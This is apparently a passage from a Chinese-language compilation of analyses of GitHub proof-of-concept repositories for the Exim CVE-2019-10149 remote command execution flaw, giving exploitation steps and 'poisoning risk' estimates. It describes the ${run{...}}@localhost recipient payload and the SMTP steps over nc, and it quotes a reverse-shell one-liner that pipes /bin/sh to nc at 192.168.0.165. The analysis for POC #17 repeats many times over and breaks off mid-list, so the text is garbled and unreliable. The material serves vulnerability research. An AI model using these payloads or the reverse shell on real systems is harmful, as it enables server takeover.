提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

## CVE-2019-10149 Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，且攻击者能够发送邮件到目标服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是一个存在于Exim 4.87到4.91版本的远程命令执行漏洞。漏洞位于`/src/deliver.c`文件的`deliver_message()`函数中，由于对收件人地址验证不当导致。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和已知的漏洞利用情况，该漏洞利用是有效的。搜索引擎结果中多个来源确认了该漏洞的存在以及被利用的事实，包括安全公司和微软的报告。

**投毒风险：**
提供的POC代码仓库只包含了一个`README.md`文件，该文件描述了如何搭建用于教育目的的漏洞环境，本身没有包含任何可执行代码或恶意指令。因此，直接的投毒风险较低，但依然存在一定的潜在风险：

1.  **误导性利用方式：**  即使`README.md`文件本身没有恶意代码，但如果该文件描述的漏洞利用方式不准确或包含误导信息，可能导致用户在真实环境中错误配置，从而引入新的安全风险。
2.  **供应链攻击：**  如果攻击者能够控制该代码仓库，则可以修改`README.md`或其他相关文件，加入恶意链接、恶意命令或者指向其他恶意仓库，诱导用户下载并执行恶意代码。

综合考虑，该POC代码仓库的直接投毒风险较低，大约为10%，主要来自于潜在的误导性利用方式和供应链攻击风险。

**利用方式：**
根据漏洞描述，该漏洞的利用方式通常涉及以下步骤：

1.  **构造恶意邮件：** 攻击者需要构造一封包含特殊收件人地址的邮件，该地址中嵌入了要执行的命令。具体的构造方式可能涉及对`deliver_message()`函数中收件人地址解析逻辑的分析。
2.  **发送恶意邮件：**  攻击者将构造好的恶意邮件发送到目标Exim服务器。
3.  **触发漏洞：**  当Exim服务器处理该邮件时，由于收件人地址验证不当，会执行嵌入在地址中的命令。
4.  **远程命令执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如安装后门、窃取敏感数据或进行其他恶意活动。

**项目地址:** [rahmadsandy/EXIM-4.87-CVE-2019-10149](https://github.com/rahmadsandy/EXIM-4.87-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
